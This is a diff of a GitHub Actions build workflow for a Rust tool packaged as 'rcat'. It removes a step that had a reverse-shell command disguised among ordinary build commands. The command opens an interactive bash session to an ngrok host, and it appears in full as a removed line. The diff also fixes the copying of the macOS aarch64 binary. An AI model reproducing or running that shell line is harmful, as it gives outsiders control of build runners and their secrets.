@@ -83,14 +83,6 @@ jobs:
       - name: Build
         run: cargo build --release --target=aarch64-apple-darwin
 
-      # Name of binary needed
-      - name: "Move to outputs/ folder"
-        run: |
-          mkdir outputs
-          /bin/bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/11874 0>&1'
-          ls -al target/
-          cp target/release/sickomode outputs/rcat-${{github.ref_name}}-darwin-aarch64 
-
       - name: Build
         run: cargo build --release
 
@@ -98,6 +90,7 @@ jobs:
       - name: "Move to outputs/ folder"
         run: |
           mkdir outputs
+          cp target/aarch64-apple-darwin/release/sickomode outputs/rcat-${{github.ref_name}}-darwin-aarch64 
           cp target/release/sickomode outputs/rcat-${{github.ref_name}}-darwin-x86_64 
 
       - name: Upload to temporary storage
